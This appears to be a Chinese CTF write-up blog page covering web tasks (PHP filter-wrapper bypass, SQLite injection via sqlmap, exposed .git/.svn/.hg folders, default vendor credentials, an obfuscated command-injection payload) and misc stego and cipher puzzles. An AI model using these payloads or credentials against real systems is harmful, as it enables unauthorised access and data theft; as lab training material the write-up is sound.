<p>先用<code>dirsearch</code>查一下网站目录结构</p>
<p><img data-src="/../images/WRITEUP/image-20221123091658340.png" alt="image-20221123091658340"></p>
<p>用伪协议试一下，发现好像和<a href="#file_include/%E6%B1%9F%E8%8B%8F%E5%B7%A5%E5%8C%A0%E6%9D%AF(1)">file_include&#x2F;江苏工匠杯(1)</a>差不多</p>
<p>使用</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/?filename=php://filter/read=convert.base64-encode/resource=./flag.php</span><br></pre></td></tr></table></figure>

<p>会提示<code>do not hack!</code>（因为read被ban了）</p>
<p>但是这里用</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/?filename=php://filter/convert.iconv.utf7.utf7/resource=./check.php</span><br></pre></td></tr></table></figure>

<p>会提示<code>you have use the right usage , but error method</code></p>
<p>说明是编码有问题，这里需要用爆破来获取结果</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">UCS-4*</span><br><span class="line">UCS-4BE</span><br><span class="line">UCS-4LE*</span><br><span class="line">UCS-2</span><br><span class="line">UCS-2BE</span><br><span class="line">UCS-2LE</span><br><span class="line">UTF-32*</span><br><span class="line">UTF-32BE*</span><br><span class="line">UTF-32LE*</span><br><span class="line">UTF-16*</span><br><span class="line">UTF-16BE*</span><br><span class="line">UTF-16LE*</span><br><span class="line">UTF-7</span><br><span class="line">UTF7-IMAP</span><br><span class="line">UTF-8*</span><br><span class="line">ASCII*</span><br></pre></td></tr></table></figure>

<p><img data-src="/../images/WRITEUP/image-20221123093656452.png" alt="image-20221123093656452"></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">preg_match(&quot;/base|quoted|write|rot13|read|zlib|print|string/i&quot;, $_GET[&quot;filename&quot;])：ban了部分关键字</span><br><span class="line">preg_match_username2 = &#x27;return preg_match(&quot;/BE|16|8|32|2/i&quot;, $_GET[&quot;filename&quot;])：限定了编码方式</span><br><span class="line">return preg_match(&quot;/4\*/i&quot;, $_GET[&quot;filename&quot;])：限定了解码的方法</span><br></pre></td></tr></table></figure>

<p>用这个编码查看<code>flag.php</code></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/?filename=php://filter/convert.iconv.ASCII%2a.UCS-4%2a/resource=flag.php</span><br></pre></td></tr></table></figure>

<p><img data-src="/../images/WRITEUP/image-20221123093934956.png" alt="image-20221123093934956"></p>
<p>得到flag</p>
<p><code>cyberpeace&#123;3c832b20348bc8051d9f1da6e444ab70&#125;</code></p>
<h2 id="FlatScience-x2F-Hack-lu-2017-4"><a href="#FlatScience-x2F-Hack-lu-2017-4" class="headerlink" title="FlatScience&#x2F;Hack.lu-2017(4)"></a>FlatScience&#x2F;Hack.lu-2017(4)</h2><p>先用<code>dirsearch</code>扫一下目录结构</p>
<p><img data-src="/../images/WRITEUP/image-20221124162139410.png" alt="image-20221124162139410"></p>
<p><code>robots.txt</code></p>
<p><img data-src="/../images/WRITEUP/image-20221124162256448.png" alt="image-20221124162256448"></p>
<p><code>admin.php</code></p>
<p><img data-src="/../images/WRITEUP/image-20221124162327564.png" alt="image-20221124162327564"></p>
<p><code>login.php</code></p>
<p><img data-src="/../images/WRITEUP/image-20221124162344460.png" alt="image-20221124162344460"></p>
<p>在这个界面可能存在POST类型的SQLite注入</p>
<p><img data-src="/../images/WRITEUP/image-20221124162719077.png" alt="image-20221124162719077"></p>
<p>抓包保存到本地，用sqlmap跑一下</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sqlmap -r sqlite --risk 3 --level 5 --batch --purge --dump-all</span><br></pre></td></tr></table></figure>

<p><img data-src="/../images/WRITEUP/image-20221124163852057.png" alt="image-20221124163852057"></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">+----+-----+-------------------------------+--------+------------------------------------------+</span><br><span class="line">| id | 255 | hint                          | name   | password                                 |</span><br><span class="line">+----+-----+-------------------------------+--------+------------------------------------------+</span><br><span class="line">| 1  | 255 | my fav word in my fav paper?! | admin  | 3fab54a50e770d830c0416df817567662a9dc85c |</span><br><span class="line">| 2  | 255 | my love is…?                  | fritze | 54eae8935c90f467427f05e4ece82cf569f89507 |</span><br><span class="line">| 3  | 255 | the password is password      | hansi  | 34b0bb7c304949f9ff2fc101eef0f048be10d3bd |</span><br><span class="line">+----+-----+-------------------------------+--------+------------------------------------------+</span><br></pre></td></tr></table></figure>

<p>得出上述结果，但是密码无法破译</p>
<p>不过这里提示了</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">my fav word in my fav paper?</span><br><span class="line">my love is…?</span><br><span class="line">the password is password</span><br></pre></td></tr></table></figure>

<p>所以密码应该在paper里</p>
<p>在<code>login.php</code>的源码里提示了</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;!-- TODO: Remove ?debug-Parameter! --&gt;</span><br></pre></td></tr></table></figure>

<p>访问</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/login.php?debug</span><br></pre></td></tr></table></figure>

<p>可以看到PHP代码</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;usr&#x27;</span>]) &amp;&amp; <span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;pw&#x27;</span>]))&#123;</span><br><span class="line">        <span class="variable">$user</span> = <span class="variable">$_POST</span>[<span class="string">&#x27;usr&#x27;</span>];</span><br><span class="line">        <span class="variable">$pass</span> = <span class="variable">$_POST</span>[<span class="string">&#x27;pw&#x27;</span>];</span><br><span class="line"></span><br><span class="line">        <span class="variable">$db</span> = <span class="keyword">new</span> <span class="title class_">SQLite3</span>(<span class="string">&#x27;../fancy.db&#x27;</span>);</span><br><span class="line">        </span><br><span class="line">        <span class="variable">$res</span> = <span class="variable">$db</span>-&gt;<span class="title function_ invoke__">query</span>(<span class="string">&quot;SELECT id,name from Users where name=&#x27;&quot;</span>.<span class="variable">$user</span>.<span class="string">&quot;&#x27; and password=&#x27;&quot;</span>.<span class="title function_ invoke__">sha1</span>(<span class="variable">$pass</span>.<span class="string">&quot;Salz!&quot;</span>).<span class="string">&quot;&#x27;&quot;</span>);</span><br><span class="line">    <span class="keyword">if</span>(<span class="variable">$res</span>)&#123;</span><br><span class="line">        <span class="variable">$row</span> = <span class="variable">$res</span>-&gt;<span class="title function_ invoke__">fetchArray</span>();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;&lt;br&gt;Some Error occourred!&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$row</span>[<span class="string">&#x27;id&#x27;</span>]))&#123;</span><br><span class="line">            <span class="title function_ invoke__">setcookie</span>(<span class="string">&#x27;name&#x27;</span>,<span class="string">&#x27; &#x27;</span>.<span class="variable">$row</span>[<span class="string">&#x27;name&#x27;</span>], <span class="title function_ invoke__">time</span>() + <span class="number">60</span>, <span class="string">&#x27;/&#x27;</span>);</span><br><span class="line">            <span class="title function_ invoke__">header</span>(<span class="string">&quot;Location: /&quot;</span>);</span><br><span class="line">            <span class="keyword">die</span>();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;debug&#x27;</span>]))</span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="string">&#x27;login.php&#x27;</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>可以看到这里password是与<code>Salz!</code>拼接后sha1</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">password=sha1($pass.&quot;Salz!&quot;)</span><br></pre></td></tr></table></figure>

<p>所以最后这里需要将所有pdf里的单词取出来经过上述处理后与sqlmap得出的密码进行比较</p>
<p>最后得出admin的密码是</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">admin ThinJerboa</span><br></pre></td></tr></table></figure>

<p>在<code>admin.php</code>登录后，得到flag</p>
<p><code>flag&#123;Th3_Fl4t_Earth_Prof_i$_n0T_so_Smart_huh?&#125;</code></p>
<h3 id="Confusion1-x2F-XCTF-4"><a href="#Confusion1-x2F-XCTF-4" class="headerlink" title="Confusion1&#x2F;XCTF(4)"></a>Confusion1&#x2F;XCTF(4)</h3><h1 id="CTFHUB"><a href="#CTFHUB" class="headerlink" title="CTFHUB"></a>CTFHUB</h1><h2 id="Vim缓存"><a href="#Vim缓存" class="headerlink" title="Vim缓存"></a>Vim缓存</h2><p>1.当vim在编辑文档的过程中如果异常退出，则会产生缓存文件。第一次产生的缓存文件后缀为.swp，第二次则产生的缓存文件后缀为.swo,第三次产生的缓存文件后缀为.swn。</p>
<p>2.使用命令vim -r 可以查看当前目录下的所有swp文件。</p>
<p>3.使用命令vim -r filename可以恢复文件，这样上次意外退出并且没有保存的修改，就可以覆盖文件。</p>
<p>4.调用这类的隐藏文件的时候，需要在最前面加.(如删除index.php.swp，则需要rm -fr* .index.php.swp).</p>
<p>5.vim使用的缓存存储是一种固定的二进制文件，我们可以通过curl命令，或者vim命令进行查看。</p>
<p>访问<code>.index.php.swp</code>，得到缓存文件，在linux中cat查看就能得到flag</p>
<p><code>ctfhub&#123;3f74df4bc6d20b7acea2c1ec&#125;</code></p>
<h2 id="Git泄露-Log"><a href="#Git泄露-Log" class="headerlink" title="Git泄露-Log"></a>Git泄露-Log</h2><p>使用<a target="_blank" rel="noopener" href="https://github.com/BugScanTeam/GitHack">GitHack工具</a>下载<code>.git</code>文件</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python2 GitHack.py http://challenge-eb02ac897a8ff3e2.sandbox.ctfhub.com:<span class="number">10800</span>/.git</span><br></pre></td></tr></table></figure>

<p>在生成的目录下使用<code>git log</code>命令获取日志</p>
<p><img data-src="/../images/WRITEUP/image-20221018152310501.png" alt="image-20221018152310501"></p>
<p>使用<code>git diff </code>查看提交比对可以得到flag</p>
<p><img data-src="/../images/WRITEUP/image-20221018152715932.png" alt="image-20221018152715932"></p>
<p>或者使用<code>git reset --hard 708f5a182dc058cd0af233e2d6758f10644622a3</code>回退到<code>add flag</code>版本，多了一个文档，打开就可以得到flag</p>
<p><img data-src="/../images/WRITEUP/image-20221018153135503.png" alt="image-20221018153135503"></p>
<p><code>ctfhub&#123;e35a6a61ed75f63fd03f4577&#125;</code></p>
<h2 id="Git泄露-Stash"><a href="#Git泄露-Stash" class="headerlink" title="Git泄露-Stash"></a>Git泄露-Stash</h2><p>与上题类似，使用GitHack下载源码，然后用<code>git log</code>查看日志</p>
<p><img data-src="/../images/WRITEUP/image-20221018170808109.png" alt="image-20221018170808109"></p>
<p>但是此次直接用<code>git diff</code>查看无新增文件</p>
<p><img data-src="/../images/WRITEUP/image-20221018170842923.png" alt="image-20221018170842923"></p>
<p>用<code>git reset</code>回退版本生成了文档，但是也没有flag</p>
<p><img data-src="/../images/WRITEUP/image-20221018170920992.png" alt="image-20221018170920992"></p>
<p>其实<code>stash</code>是缓存的意思</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">将本地没提交的内容(git commit的内容不会被缓存 但git add的内容会被缓存)进行缓存并从当前分支移除，缓存的数据结构为堆栈，先进后出</span><br></pre></td></tr></table></figure>

<p>使用<code>git stash list</code>查看缓存记录</p>
<p><img data-src="/../images/WRITEUP/image-20221018171013771.png" alt="image-20221018171013771"></p>
<p>使用<code>git stash pop</code>可以弹出最新 stash 的内容，并删除该 stash</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">如果想要指定弹出某个 stash，可以使用：</span><br><span class="line">git stash pop stash@&#123;$num&#125; </span><br></pre></td></tr></table></figure>

<p>使用<code>git stash apply</code>也会将最新的改动还原到代码中，默认返回 stash{0}，与pop不同的是apply 不会删除 stash{0}</p>
<p>这里使用二者都可以，发现文档内容发生改变，得到flag</p>
<p><img data-src="/../images/WRITEUP/image-20221018171228336.png" alt="image-20221018171228336"></p>
<p><img data-src="/../images/WRITEUP/image-20221018171315925.png" alt="image-20221018171315925"></p>
<p><code>ctfhub&#123;69ac1262b1f2cfab32c09553&#125;</code></p>
<h2 id="Git泄露-Index"><a href="#Git泄露-Index" class="headerlink" title="Git泄露-Index"></a>Git泄露-Index</h2><p>直接GitHack就能得到带flag的文档</p>
<p><img data-src="/../images/WRITEUP/image-20221018171612316.png" alt="image-20221018171612316"></p>
<p><code>ctfhub&#123;2b8c264edd050a99208d58ad&#125;</code></p>
<h2 id="SVN泄露"><a href="#SVN泄露" class="headerlink" title="SVN泄露"></a>SVN泄露</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SVN是subversion的缩写，是一个开放源代码的版本控制系统</span><br></pre></td></tr></table></figure>

<p>下载<code>dvcs-ripper</code>工具</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">git clone https://github.com/kost/dvcs-ripper</span><br></pre></td></tr></table></figure>

<p>安装相关组件</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo apt-get install perl libio-socket-ssl-perl libdbd-sqlite3-perl libclass-dbi-perl libio-all-lwp-perl</span><br></pre></td></tr></table></figure>

<p>使用工具进行处理</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">./rip-svn.pl -v -u http://challenge-350f55b7f4229231.sandbox.ctfhub.com:10800/.svn/</span><br></pre></td></tr></table></figure>

<p>进入<code>.svn/pristine</code>目录，查看文件，发现有两个文件夹</p>
<p><img data-src="/../images/WRITEUP/image-20221024160207546.png" alt="image-20221024160207546"></p>
<p>其中<code>bb</code>文件夹中有一个文档，记录了flag</p>
<p><img data-src="/../images/WRITEUP/image-20221024160304334.png" alt="image-20221024160304334"></p>
<p>另一个<code>bf</code>文件夹记录了当前html内容</p>
<p><img data-src="/../images/WRITEUP/image-20221024160339892.png" alt="image-20221024160339892"></p>
<p><code>ctfhub&#123;3503d217e9a14b5d95df7855&#125;</code></p>
<h2 id="HG泄露"><a href="#HG泄露" class="headerlink" title="HG泄露"></a>HG泄露</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">当开发人员使用 Mercurial 进行版本控制，对站点自动部署。如果配置不当,可能会将.hg 文件夹直接部署到线上环境。这就引起了 hg 泄露漏洞</span><br></pre></td></tr></table></figure>

<p>使用<code>dvcs-ripper</code>里的<code>rip-hg.pl</code>工具</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">./rip-hg.pl -v -u http://challenge-b5f8d3ea776f7b25.sandbox.ctfhub.com:10800/.hg</span><br></pre></td></tr></table></figure>

<p>得到<code>.hg</code>隐藏文件夹</p>
<p>进入<code>.hs/store</code>目录，查看fncache文件</p>
<p><img data-src="/../images/WRITEUP/image-20221024161412440.png" alt="image-20221024161412440"></p>
<p>访问<code>/flag_14633778.txt</code>，得到flag</p>
<p><code>ctfhub&#123;cd9a58d44428b89a86c3b54e&#125;</code></p>
<h2 id="弱口令"><a href="#弱口令" class="headerlink" title="弱口令"></a>弱口令</h2><p>《论字典的选择》</p>
<p><img data-src="/../images/WRITEUP/image-20221024163354760.png" alt="image-20221024163354760"></p>
<p><code>ctfhub&#123;300f7c6b0200acc7395561f8&#125;</code></p>
<h2 id="默认口令"><a href="#默认口令" class="headerlink" title="默认口令"></a>默认口令</h2><p>增加了验证码，提高了爆破门槛</p>
<p><a target="_blank" rel="noopener" href="https://blog.csdn.net/qq_41262248/article/details/118578054">常见口令</a></p>
<p>不过百度搜一下就能搜到<code>eyou</code>的默认密码</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">账号:eyougw 密码:admin@(eyou)</span><br></pre></td></tr></table></figure>

<p>登录后就能得到flag</p>
<p><code>ctfhub&#123;d522ac8ac36a7648028f93f5&#125;</code></p>
<h1 id="联通网络安全"><a href="#联通网络安全" class="headerlink" title="联通网络安全"></a>联通网络安全</h1><h2 id="WEB-RRRCE"><a href="#WEB-RRRCE" class="headerlink" title="WEB-RRRCE"></a>WEB-RRRCE</h2><p><a target="_blank" rel="noopener" href="https://www.cnblogs.com/Riv3r1and/p/13732800.html">参考</a></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?host=123%26a=f%26%26b=g%26%26c=la%26%26d=%60expr$%7BIFS%7Dsubstr$%7BIFS%7D%22$APACHE_CONFDIR%22$%7BIFS%7D1$%7BIFS%7D1%60%26%26ca%22%22t$&#123;IFS&#125;$d$a$c$b</span><br></pre></td></tr></table></figure>

<h2 id="WEB-SearchBar"><a href="#WEB-SearchBar" class="headerlink" title="WEB-SearchBar"></a>WEB-SearchBar</h2><h1 id="MISC"><a href="#MISC" class="headerlink" title="MISC"></a>MISC</h1><h2 id="工具"><a href="#工具" class="headerlink" title="工具"></a>工具</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">数据隐写：010Editor、Stegsolve</span><br><span class="line">流量分析：Wireshark</span><br><span class="line">电子取证：volatility</span><br><span class="line">物联网：QEMU、Binwalk</span><br><span class="line">密码破解：HashCat、EWSA</span><br></pre></td></tr></table></figure>

<p><a target="_blank" rel="noopener" href="https://www.sweetscape.com/download/010editor/">010Editor：一款快速且强大的十六进制编辑器。用来编辑二进制文件</a></p>
<p><a target="_blank" rel="noopener" href="https://stegonline.georgeom.net/upload">StegOnline：图片隐写工具 StegSolve 的 Web 版</a></p>
<p><a target="_blank" rel="noopener" href="https://ezgif.com/split">ezgif：GIF 在线分帧工具</a></p>
<p><a target="_blank" rel="noopener" href="http://www.hiencode.com/">CTF在线工具</a></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">流量取证：tcpxtract</span><br><span class="line">文件分析：binwalk</span><br><span class="line">文件分离：dd</span><br><span class="line">python反编译：uncompyle6</span><br><span class="line">SSTV：MMSSTV</span><br></pre></td></tr></table></figure>

<p><a target="_blank" rel="noopener" href="http://www.hiencode.com/">在线编解码</a></p>
<h1 id="攻防世界-1"><a href="#攻防世界-1" class="headerlink" title="攻防世界"></a>攻防世界</h1><h2 id="删库跑路-x2F-XSCTF联合招新赛-1"><a href="#删库跑路-x2F-XSCTF联合招新赛-1" class="headerlink" title="删库跑路-&#x2F;XSCTF联合招新赛(1)"></a>删库跑路-&#x2F;XSCTF联合招新赛(1)</h2><p><strong>binwalk</strong></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">binwalk -e vm-106-disk-1.qcow2</span><br></pre></td></tr></table></figure>

<p>得到文件，flag在压缩包<code>8091000</code>中</p>
<p><strong>winhex</strong></p>
<p>用<code>winhex</code>打开文件，使用<code>Tools-Disk Tools-File Recovery by Type</code></p>
<p><img data-src="/../images/WRITEUP/image-20221205161039322.png" alt="image-20221205161039322"></p>
<p>全选，恢复，flag在<code>000001.gz</code>中</p>
<p><code>flag&#123;c28c424b-fd8c-45b9-b406-0a933b1ca7b1&#125;</code></p>
<h2 id="凯撒大帝在培根里藏了什么-x2F-XSCTF联合招新赛-1"><a href="#凯撒大帝在培根里藏了什么-x2F-XSCTF联合招新赛-1" class="headerlink" title="凯撒大帝在培根里藏了什么&#x2F;XSCTF联合招新赛(1)"></a>凯撒大帝在培根里藏了什么&#x2F;XSCTF联合招新赛(1)</h2><p>有一串字符串</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ABBABAABBAAAAABABABAABABBAAAAABAABBAAABAABBBABBAABABBABABAAABABBBAABAABABABBBAABBABAA</span><br></pre></td></tr></table></figure>

<p>这是<a target="_blank" rel="noopener" href="http://www.hiencode.com/baconian.html">培根密码</a>，解密得到</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ngbklatcoznixevzu</span><br></pre></td></tr></table></figure>

<p>那这就是<a target="_blank" rel="noopener" href="http://www.hiencode.com/caesar.html">凯撒密码</a>了，但是不知道具体的偏移量，最后试出来偏移量为6</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">havefunwithcrypto</span><br></pre></td></tr></table></figure>

<p>而flag提示是</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">格式为flag&#123;你所得到的大写字符串&#125;</span><br></pre></td></tr></table></figure>

<p><code>flag&#123;HAVEFUNWITHCRYPTO&#125;</code></p>
<h2 id="简单的base编码-x2F-XSCTF联合招新赛-1"><a href="#简单的base编码-x2F-XSCTF联合招新赛-1" class="headerlink" title="简单的base编码&#x2F;XSCTF联合招新赛(1)"></a>简单的base编码&#x2F;XSCTF联合招新赛(1)</h2><p>这题是<code>BASE64</code>编解码，而且要一直解码</p>
<p>解码二十次，得到</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">F#S&lt;YRa[$*x7,&gt;&#123;F3DH5N/3.5+J6WD%P841JRN_i51F1Z!</span><br></pre></td></tr></table></figure>

<p>这是<a target="_blank" rel="noopener" href="http://www.hiencode.com/base92.html">base92编码</a>，解码得到flag</p>
<p><code>flag&#123;d0_y0u_l1ke_base92_!??!_by_Sh3n&#125;</code></p>
<h2 id="来自银河的信号-x2F-江苏工匠杯-1"><a href="#来自银河的信号-x2F-江苏工匠杯-1" class="headerlink" title="来自银河的信号&#x2F;江苏工匠杯(1)"></a>来自银河的信号&#x2F;江苏工匠杯(1)</h2><p>浅听了一下，差点给我弄聋了</p>
<p>这是用SSTV来传输信息</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sstv一般指慢扫描电视。 慢扫描电视（Slow-scan television）是业余无线电爱好者的一种主要图片传输方法，慢扫描电视通过无线电传输和接收单色或彩色静态图片。</span><br></pre></td></tr></table></figure>

<p>用<a target="_blank" rel="noopener" href="https://hamsoft.ca/pages/mmsstv.php">MMSSTV</a>，外放音频或者用虚拟声卡<a target="_blank" rel="noopener" href="https://www.e2esoft.cn/download/vsc">VSC</a>作为输入设备，等它放完，就能得到图片</p>
<p><img data-src="/../images/WRITEUP/image-20221205171650156.png" alt="image-20221205171650156"></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">f7liavga&#123;1M_0105n_cC@okmei_nFge!s&#125;</span><br><span class="line">只能说太抽象了</span><br></pre></td></tr></table></figure>

<p>这个还要经过<a target="_blank" rel="noopener" href="http://www.hiencode.com/railfence.html">栅栏密码()</a>加密后得到flag，栏数为2</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">栅栏密码：把将要传递的信息中的字母交替排成上下两行,再将下面一行字母排在上面一行的后边,从而形成一段密码</span><br><span class="line">例如 a1b2-&gt;ab12</span><br><span class="line">a 1</span><br><span class="line">b 2</span><br></pre></td></tr></table></figure>

<p><code>flag&#123;M00nc@ke_Fes7iva1_15_Coming!&#125;</code></p>
<h2 id="steg没有py-x2F-江苏工匠杯-1"><a href="#steg没有py-x2F-江苏工匠杯-1" class="headerlink" title="steg没有py&#x2F;江苏工匠杯(1)"></a>steg没有py&#x2F;江苏工匠杯(1)</h2><p>这里用的是<code>stegpy</code>，我还以为是<code>stegsolve</code></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">stegsolve是工具，stegpy是隐写方式</span><br></pre></td></tr></table></figure>

<p>而且这里还需要密码来解密，此处没有提示，但是原题有提示密码是16位，刚好是文件名<code>Do_you_like_misc</code></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">stegpy Do_you_like_misc.png -p</span><br><span class="line">Do_you_like_misc</span><br></pre></td></tr></table></figure>

<p>解密得到文件<code>_encrypt.txt</code>，内容为</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">eyjd&#123;4e71wf_H1uc3s_15_EEEEpwwl!!&#125;</span><br><span class="line"></span><br><span class="line">a,b∈(1,25]</span><br><span class="line">a=x**2;</span><br><span class="line">b=(x-2)**2;</span><br><span class="line">print(a,b)</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">x=4,5</span><br><span class="line">a=16,25</span><br><span class="line">b=4,9</span><br></pre></td></tr></table></figure>

<p>这是一个仿射密码<code>Affine Cipher</code> ，<code>a=25,b=9</code></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">eyjd&#123;4e71wf_H1uc3s_15_EEEEpwwl!!&#125;</span><br><span class="line">flag&#123;4f71ne_c1ph3r_15_ffffunny!!&#125;</span><br></pre></td></tr></table></figure>

<p>这里还要根据密文字符大小写改一下格式，得到flag</p>
<p><code>flag&#123;4f71ne_C1ph3r_15_FFFFunny!!&#125;</code></p>
<h2 id="时间刺客！-x2F-江苏工匠杯-1"><a href="#时间刺客！-x2F-江苏工匠杯-1" class="headerlink" title="*时间刺客！&#x2F;江苏工匠杯(1)"></a>*时间刺客！&#x2F;江苏工匠杯(1)</h2><p>本题提示是<strong>时间不站在你那边</strong>，四张图片的修改时间分别是</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">1.jpg:1709年1月7日，0:43:49</span><br><span class="line">2.jpg:2009年3月31日，5:38:29</span><br><span class="line">3.jpg:1986年6月19日，4:24:09</span><br><span class="line">4.jpg:1718年7月2日，15:24:11</span><br></pre></td></tr></table></figure>

<p>把它们转换成时间戳，但是时间戳是从<code>1970-01-01 08:00:00</code>开始的</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">-8235846971</span><br><span class="line">1238449109</span><br><span class="line">519510249</span><br><span class="line">-7936590949</span><br></pre></td></tr></table></figure>

<p>wp说跑下面这个就行，没看懂</p>
